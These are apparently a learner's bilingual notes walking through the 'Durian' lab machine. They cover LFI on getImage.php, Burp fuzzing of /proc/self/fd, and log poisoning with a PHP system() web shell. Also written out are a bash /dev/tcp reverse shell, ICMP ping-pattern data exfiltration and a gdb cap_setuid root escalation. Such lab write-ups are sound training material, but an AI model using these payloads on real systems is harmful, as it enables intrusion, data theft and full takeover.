Skills

- Web Enumeration
- Local File Inclusion (LFI)

- LFI to RCE - Abusing /proc/self/fd/X + Log Poisoning
- Abusing capabilities (cap_setuid+ep on gdb binary) [Privilege Escalation]

Certifications
eJPT eWPT



As you know we started like allways, now we are going to se whatweb

http://192.168.0.63:8000 

```
[200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[192.168.0.63], Title[Durian], nginx[1.14.2] 
```
i havent the http in the port 80, i dont know why ,maybe i cannot do this machine

on the port 7080, we have a redirect or something

whatweb gives us this
```
[200 OK] Bootstrap, Cookies[LSUI37FE0C43B84483E0,litespeed_admin_lang], Country[RESERVED][ZZ], HTML5, HTTPServer[LiteSpeed], HttpOnly[LSUI37FE0C43B84483E0,litespeed_admin_lang], IP[192.168.0.63], JQuery[2.2.4], LiteSpeed, Meta-Author[LiteSpeed Technologies, Inc.], Object[image/svg+xml], PHP[5.6.36], PasswordField[pass], Script[text/javascript], Title[LiteSpeed WebAdmin Console], UncommonHeaders[referrer-policy,x-content-type-options,alt-svc], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.6.36], X-UA-Compatible[IE=edge], X-XSS-Protection[1;mode=block]

```

ACCEPT RISK AND CONTINUE ON THE WEB
(esto es un certificado autofirmado, y esto esta considerado una vulnerabilidad de seguridad, por eso sale este catel.)

searchsploit openlitespeed, this are the vulnerabilities
```
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
OpenLitespeed 1.3.9 - Use-After-Free (Denial of Service)                | linux/dos/37051.c
Openlitespeed 1.7.9 - 'Notes' Stored Cross-Site Scripting               | multiple/webapps/49727.txt
Openlitespeed Web Server 1.7.8 - Command Injection (Authenticated) (1)  | multiple/webapps/49483.txt
Openlitespeed WebServer 1.7.8 - Command Injection (Authenticated) (2)   | multiple/webapps/49556.py
------------------------------------------------------------------------ ---------------------------------
```

on the http://192.168.0.63:8088/

we have a image of the "durian", but unfortunately i havent the image, because my server os sql is broken...i dont know if this is crucial or not

now we are going to gobuster, and watch on the directories of the page in 7080


gobuster dir -k -u https://192.168.0.63:7080  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20

i have to use locate 

/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

-t is aluding to the threads
```
gobuster dir --help | grep certifi

 -k, --no-tls-validation                 Skip TLS certificate verification
```

-k (elude el certificado de riesgo y continuar)

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.0.63:7080
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/04 21:48:35 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 301) [Size: 1260] [--> https://192.168.0.63:7080/docs/]
/view                 (Status: 301) [Size: 1260] [--> https://192.168.0.63:7080/view/]
/lib                  (Status: 301) [Size: 1260] [--> https://192.168.0.63:7080/lib/]
/res                  (Status: 301) [Size: 1260] [--> https://192.168.0.63:7080/res/]
Progress: 220382 / 220561 (99.92%)
===============================================================
2023/08/04 21:50:43 Finished
===============================================================
```

with the --add-slash at the end this command can find more stufs, so we are going to try again

and no... even less folders
this is the only one
/docs/   

We are going to try with another
gobuster dir  -u http://192.168.0.63:8000  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20 --add-slash

```
/blog/                (Status: 403) [Size: 169]
/cgi-data/            (Status: 403) [Size: 169]
```

gobuster dir  -u http://192.168.0.63:8000  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20

the same without slash
```
/blog                 (Status: 301) [Size: 185] [--> http://192.168.0.63:8000/blog/]
/cgi-data             (Status: 301) [Size: 185] [--> http://192.168.0.63:8000/cgi-data/]

```

as i told, have problems, i have no cgi data

This is what i cannot see, and its very interesting, and easy to do it 
![[whaticantsee.png]]

gobuster dir  -u http://192.168.0.63:8088  -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 20

This is the other result
```
/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.0.63:8088/cgi-bin/]
/img                  (Status: 301) [Size: 1260] [--> http://192.168.0.63:8088/img/]
/docs                 (Status: 301) [Size: 1260] [--> http://192.168.0.63:8088/docs/]
/css                  (Status: 301) [Size: 1260] [--> http://192.168.0.63:8088/css/]
/protected            (Status: 301) [Size: 1260] [--> http://192.168.0.63:8088/protected/]
/blocked              (Status: 301) [Size: 1260] [--> http://192.168.0.63:8088/blocked/]


```

i fixed it , now i see the 80 port open


this code permtes us to add the parameter file, and get some resource
```
</?php include $_GET['file']; */
```
?file=/etc/passwd
```
view-source:http://192.168.0.64/cgi-data/getImage.php?file=/etc/passwd
```

si no tuvieramos esa variable , intentariamos "fuzzarla" con algna herramienta y despues tambien fuzzar los parametros a  buscar

This two ussers have a bash, so they are users of the system
```
root:x:0:0:root:/root:/bin/bash
durian:x:1000:1000:durian,,,:/home/durian:/bin/bash
```

view-source:http://192.168.0.64/cgi-data/getImage.php?file=/proc/net/tcp

this is an enumeration of procces net tcp

```
|   |
|---|
|sl local_address rem_address st tx_queue rx_queue tr tm->when retrnsmt uid timeout inode|
||0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 13923 1 00000000b8622a19 100 0 0 10 0|
||1: 00000000:1F98 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 14111 1 00000000cd88e2ca 100 0 0 10 128|
||2: 00000000:1BA8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 14109 1 00000000d74a7604 100 0 0 10 128|
||3: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000 106 0 14320 1 0000000058ffc320 100 0 0 10 0|
```

So with curl we are going to get this lines
```
curl -s -X GET "http://192.168.0.64/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4
```
i need to see more info about tail -n on this pipe
```
curl -s -X GET "http://192.168.0.64/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4 | awk '{print $2}'
```
(this filters on the second argument)

```
00000000:0016
00000000:1F98
00000000:1BA8
0100007F:0CEA

```


```
curl -s -X GET "http://192.168.0.64/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4 | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}' 
```
esto de tr transforma los : en espacios, y se queda con la parte dos, pero no entiendo bien el codigo
```
0016
1F98
1BA8
0CEA
```
valores hexadecimales, puertos abiertos afuera de la maquina

Un ciclo for, para tener esto...
```
for port in $(curl -s -X GET "http://192.168.0.65/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4 | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}'); do echo "[+] Puerto $port "; done
```
esto...
```
[+] Puerto 0016
[+] Puerto 1F98
[+] Puerto 1BA8
[+] Puerto 0CEA
```
para pasar hexadecimal a decimal

```
for port in $(curl -s -X GET "http://192.168.0.65/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4 | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}'); do echo "[+] Puerto $port -> $(echo "obase-10; ibase=16; $port" | bc)"; done
```
There is something strange.. because i have a zero (????)
```
[+] Puerto 0016 -> 0
22
[+] Puerto 1F98 -> 0
8088
[+] Puerto 1BA8 -> 0
7080
[+] Puerto 0CEA -> 0
3306
```

| sort -n applys numeric order 
-k is the key .. 5 (based on the 5 value)

```
cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/Durian/content$ for port in $(curl -s -X GET "http://192.168.0.65/cgi-data/getImage.php?file=/proc/net/tcp" | tail -n 4 | awk '{print $2}' | tr ':' ' ' | awk 'NF{print $NF}'); do echo "[+] Puerto $port -> $(echo "obase-10; ibase=16; $port" | bc)"; done | sort -n -k 6
[+] Puerto 0016 -> 0
[+] Puerto 0CEA -> 0
[+] Puerto 1BA8 -> 0
[+] Puerto 1F98 -> 0
22
3306
7080
8088
```
Now we are going to see proces of the machine.

in the folder /proc/sched_debug

there is a loot of information there

```
cds@cds:~$ curl -s -X GET "http://192.168.100.58/cgi-data/getImage.php?file=/etc/passwd" | grep "sh$" 
root:x:0:0:root:/root:/bin/bash
durian:x:1000:1000:durian,,,:/home/durian:/bin/bash

```
We can see shells on the sistem
```
cds@cds:~$ curl -s -X GET "http://192.168.100.58/cgi-data/getImage.php?file=/etc/shells" | grep "sh$" 
/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash

```

Lets see if we can get her private passwd, of durian. The user durian.

```
THE PLACE WHERE IS THE PRIVATE PASSWORD OF A USER IS HERE

/home/name of the user/.ssh/id_rsa

apache logs

/var/log/apache2/access.log

LOGS OF SSH's

/var/log/auth.log
```


watching on the folders directly we have no acces, but maybe with burpsuit we can se logs, or other things that we have not read permissions.

/proc/self is where we are going to investigate

we are going to watch the process, individualy with burpsuit

"http://192.168.100.58/cgi-data/getImage.php?file=/proc/491/cmdline" 

We have this, so /usr/sbin/apache2 -k start  was the origin of the proces
![[burp.png]]


/proc/self/fd this have numbers inside



Now, he is using ctrl i on the repeater, and in the burpsuit direction he has changed the /proc/491/cmdline for
/proc/self/fd0

with ctrl+i we put the "intruder" in burpsuit
![[CTRLI+INTRUDERSNIPER.png]]
We must click on "clear" and he is going to put a payload on the url

now, he puts add, beside of /0

![[add.png]]

now on "payloads" we add a utile charge of "numbers", in payload type we put numbers

![[payloads.png]]

we must put tue number, from 1 , to 30 for example step 1 by 1 , and here changes the url.So we do not change manually the url, and burpsuit does automatically, and then we can read the information of the process on burpsuit

![[atak.png]]


Creo que la idea es ver los log de las peticiones get que obtenemos del servidor apache.

No entendi mucho el punto de esta parte, pudimos ver informacion. Pero la idea del muchacho es meter codigo php en la peticion. 

Cuando ponemos probando y que nos de un erro de la pagina tenemos otra cosa si en burpsuit lo vemos

We can see the " probando " log to the apache server
![[logs.png]]

tirando del /proc/self/fd/8 podemos ver los logs. 

la idea es log poisoning

dice que hay que representar codigo php en el navegador.. y si pudieramos hacerlo deberia poder interpretarse.

Por el user agent, dice que podemos manipularlo

se inyectaria codigo en la parte que dice "user agent"

We must put something like this
```
<?php system('whoami'); ?>
```

and now.. we can see it in the place of the "logs", and we are www-data

![[logsdwq.png]] 

Dice "yo mas que insertar el comando a ejecutar quiero controlar el comando a travez de un parametro"
por ejemplo
```
($_GET['cmd'])
```
"yo voy a crear un parametro CMD a travez del cual cuando yo le diga ?cmd=whoami" que ese whoami me lo pase como cadena, para que luego se ejecute el comando, pero el comando que yo quiera, voy a tener control

This is the comand
```
<?php system($_GET['cmd']); ?>
```

if we look now on the url, before sending the comand on the user agent.. 
```
http://192.168.100.58//cgi-data/getImage.php?file=/proc/self/fd/8&cmd=pwd
```

so.. if we can execute commands, we now are going to listen with netcat and execute comands on a terminal sending the command
bash -c "bash -i >%26 /dev/tcp/192.168.100.4/443 0>%261"

and it works



treatment to the console 
script /dev/null -c bash
ctrl +z 
stty raw -echo; fg
reset xterm
TERM=xterm

Lets go to the folder /home/durian

we have no password 

id (we are not in some group)

sudo -l 
we can execute things

```
User www-data may run the following commands on durian:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /bin/ping
www-data@durian:/home/durian$ 

```

ping and shutdown

ping is interesting

we can do "data exfiltration" with ping

dice que en xxd -p -c 4 /etc/hosts podemos ver cosas  (esta en hexadecimal)

-p (patron)
-c en pares de 4 

"dice que se puede lanzar con ping un paquete pero a la vez un patron, y este patron indicaba datos para filtrar por ICMP" Y con scapy desde python nos creabamos un "listener, sniffer" para interpretar todo lo que nos llegara por ICMP y que represente el output todo bonito"
```
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 127.0.0.1 -p $line ; done
```

envias un ping y a la vez un patron , y si te abres wireshark

wireshark &> /dev/null & disown 

(ahi hay que mirar la loopback)

todo eso es la data del etc/hosts

con scapy lo parseaba todo para que se vea "super bonito" y se robaba mucha informacion a una pc windows

xxd

so... we are going to find priviledges suid on the system

find \-perm -4000 2>/dev/null

not so much.. so we are going to watch capabilities on the sistem

getcap -r / 2>/dev/null
 
2>/dev/null (redirige el stdr al dev null para no verlo (???))

```
www-data@durian:/$ getcap -r / 2>/dev/null
/usr/bin/gdb = cap_setuid+ep
/usr/bin/ping = cap_net_raw+ep

```
setuid is interesting

 Capabilities[](https://gtfobins.github.io/gtfobins/gdb/#capabilities)

If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.

This requires that GDB is compiled with Python support.


we have the capability of seuid

a shell
```
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

a bash
```
gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
```

and we are root
















